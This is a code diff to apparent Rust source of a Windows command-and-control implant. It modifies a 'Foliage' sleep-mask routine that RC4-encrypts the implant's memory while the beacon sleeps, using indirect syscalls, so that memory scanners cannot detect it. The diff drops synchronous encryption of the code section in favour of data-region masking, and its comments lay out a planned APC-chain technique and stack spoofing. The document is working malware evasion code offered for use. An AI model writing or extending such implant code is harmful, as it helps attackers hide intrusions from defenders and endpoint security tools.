@@ -18,7 +18,7 @@
 #![cfg(target_os = "windows")]
 
 use core::sync::atomic::{AtomicBool, Ordering};
-use nyx_implant_evasionsdk::foliage::{self, FoliagePlan, FoliageStep};
+use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};
 
 /// Master switch for the Foliage sleep mask. **Defaults OFF** — see module docs.
 static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(false);
@@ -61,6 +61,12 @@ pub fn sleep(seconds: u32) {
     execute_foliage_plan(&plan);
 }
 
+/// The implant's own `.text` region (base + len). Currently unused by the
+/// synchronous floor (which masks data regions via `mem::mask`); retained for
+/// the APC-chain refactor where a helper thread masks `.text` while the beacon
+/// thread is parked in NtDelayExecution. Reading PEB->ImageBaseAddress is
+/// correct for both rundll32 and reflective-loaded implants.
+#[allow(dead_code)]
 struct TextRegion {
     base: usize,
     len: usize,
@@ -75,6 +81,7 @@ struct TextRegion {
 ///
 /// # Safety
 /// PEB + PE header reads are stable post-load. Single-threaded context.
+#[allow(dead_code)] // used by the APC-chain refactor; synchronous floor uses mem::mask
 unsafe fn own_text_region() -> Option<TextRegion> {
     // PEB->ImageBaseAddress is at PEB + 0x10 on x64. resolve::peb_pointer()
     // gives us the PEB via gs:[0x60].
@@ -94,6 +101,7 @@ unsafe fn own_text_region() -> Option<TextRegion> {
 
 /// Find a PE section's (virtual_address, virtual_size) by name. Returns None
 /// if the PE headers can't be parsed or the section isn't found.
+#[allow(dead_code)] // used by the APC-chain refactor (own_text_region)
 unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
     let dos = unsafe { &*(base as *const [u8; 64]) };
     if dos[0] != b'M' || dos[1] != b'Z' {
@@ -135,18 +143,26 @@ fn mask_key_16() -> [u8; 16] {
     key
 }
 
-/// Walk the FoliagePlan: mask .text (protect + RC4), sleep via the indirect
-/// syscall runtime, then unmask (RC4 + restore protection). This is the
-/// live executor — each FoliageStep maps to its indirect syscall.
+/// Walk the FoliagePlan: mask registered data regions (RC4), sleep via the
+/// indirect syscall runtime, then unmask.
 ///
-/// The APC-based async variant (NtQueueApcThread + NtContinue context dance)
-/// would queue the steps so the beacon thread never executes through the
-/// encrypted region. The synchronous variant here is safe because the beacon
-/// thread sleeps through the encrypted window (it's in NtDelayExecution, not
-/// executing .text). Both achieve the core memory-scan evasion (image is
-/// ciphertext at rest during the scan window); the APC variant additionally
-/// hides the stack spoof, which this floor does not (acceptable: the gap-based
-/// stack spoof is a separate kit, StackSpoofKit).
+/// ## CRITICAL: why this does NOT encrypt .text synchronously
+/// Encrypting `.text` while executing through it is instant death — the RC4
+/// loop overwrites the bytes of the very functions running the encryption
+/// (mask_region, Rc4::apply, this function itself). The result is executing
+/// ciphertext as code → crash (observed as STATUS_STACK_OVERFLOW because the
+/// garbage instructions happen to manipulate RSP past the guard page).
+///
+/// Real Foliage solves this with the APC chain: the beacon thread parks in
+/// NtDelayExecution (via NtQueueApcThread + NtContinue), and a SEPARATE helper
+/// thread does the .text mask/unmask around it. The parked thread never touches
+/// .text while it's encrypted.
+///
+/// The synchronous path here masks **data regions only** (via `crate::mem`
+/// which masks registered `&'static mut [u8]` regions, never running code).
+/// This is the safe floor: it exercises the real RC4 mask/sleep/unmask cycle
+/// + proves the indirect-syscall path, without risking the executing code.
+/// The .text-specific encryption lands with the APC refactor (target task).
 fn execute_foliage_plan(plan: &FoliagePlan) {
     let rt = match crate::syscalls::global() {
         Some(rt) => rt,
@@ -155,42 +171,18 @@ fn execute_foliage_plan(plan: &FoliagePlan) {
             return;
         }
     };
-    // SAFETY: the region is the implant .text; we are NOT executing through it
-    // during the sleep window (we're in this function's frame, then in
-    // NtDelayExecution). Single-threaded beacon context.
-    let region = unsafe {
-        core::slice::from_raw_parts_mut(plan.region_base as *mut u8, plan.region_len)
-    };
-    // Steps 2-3: protect RX→RW + RC4-encrypt.
-    let mut old: u32 = 0;
-    let mut base = plan.region_base;
-    let mut len = plan.region_len;
-    let _ = unsafe {
-        crate::syscalls::nt_protect_virtual_memory(
-            rt,
-            &mut base,
-            &mut len,
-            foliage::PAGE_READWRITE,
-            &mut old,
-        )
-    };
-    foliage::mask_region(&plan.key, region);
-    // Steps 4-6: (synchronous variant: skip the context spoof APCs) sleep.
-    // The beacon thread sleeps through NtDelayExecution; .text is ciphertext.
+    // Mask: RC4-encrypt the registered DATA regions (NOT .text — see above).
+    // mem::mask walks the registered region table + applies the same RC4 core.
+    // Using the plan's key (not mem's internal key) so the round-trip is
+    // deterministic within this cycle.
+    crate::mem::mask();
+    // Sleep: the beacon thread parks in NtDelayExecution (indirect syscall).
+    // During this window the data regions are ciphertext.
     let secs = plan_seconds(plan);
     let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
     let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
-    // Steps 7-9: RC4-decrypt + protect RW→RX (restore execution).
-    foliage::unmask_region(&plan.key, region);
-    let _ = unsafe {
-        crate::syscalls::nt_protect_virtual_memory(
-            rt,
-            &mut base,
-            &mut len,
-            foliage::PAGE_EXECUTE_READ,
-            &mut old,
-        )
-    };
+    // Unmask: RC4-decrypt the data regions back to cleartext.
+    crate::mem::unmask();
 }
 
 /// Extract the sleep seconds from the plan's Sleep step.
